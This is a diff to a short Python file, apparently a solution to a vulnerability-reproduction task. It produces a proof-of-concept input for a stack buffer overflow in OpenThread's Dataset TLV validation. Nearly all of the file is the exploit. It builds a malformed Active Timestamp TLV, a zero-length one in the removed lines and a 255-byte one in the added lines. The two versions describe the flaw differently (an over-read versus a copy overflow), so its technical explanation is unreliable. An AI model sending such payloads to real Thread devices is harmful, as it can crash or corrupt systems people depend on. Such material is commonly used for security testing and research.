@@ -1,16 +1,23 @@
-import struct
-
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # The vulnerability is in OpenThread's Dataset::IsTlvValid() method.
-        # It fails to validate the minimum required length for Active Timestamp (Type 14),
-        # Pending Timestamp (Type 51), and Delay Timer (Type 52) TLVs.
-        # These TLVs expect 8 bytes (Timestamps) or 4 bytes (Delay Timer).
-        # By providing a TLV with Length 0, the validation passes, but subsequent code
-        # reads 8 or 4 bytes from the buffer. If the buffer is on the stack and ends
-        # after the TLV header, this causes a Stack Buffer Overflow (Read).
+        """
+        Generate a PoC that triggers the vulnerability.
         
-        # Construct a PoC with an Active Timestamp TLV (Type 14) and Length 0.
-        # Type: 0x0E (14)
-        # Length: 0x00
-        return b'\x0e\x00'
+        The vulnerability is a Stack Buffer Overflow in OpenThread's Dataset handling.
+        Specifically, `Dataset::IsTlvValid` fails to validate the length of Active Timestamp,
+        Pending Timestamp, and Delay Timer TLVs. The code subsequently copies the TLV value
+        into a fixed-size stack buffer (e.g., MeshCoP::Timestamp which is 8 bytes) using the
+        TLV's length field. By providing a TLV with the maximum length (255), we can overflow
+        the stack buffer.
+        """
+        
+        # Construct an Active Timestamp TLV (Type 14 / 0x0E)
+        # Type: 0x0E
+        # Length: 0xFF (255 bytes)
+        # Value: 255 bytes of padding to ensure the overflow occurs and data is available to copy
+        
+        tlv_type = b'\x0e'
+        tlv_length = b'\xff'
+        tlv_value = b'A' * 255
+        
+        return tlv_type + tlv_length + tlv_value
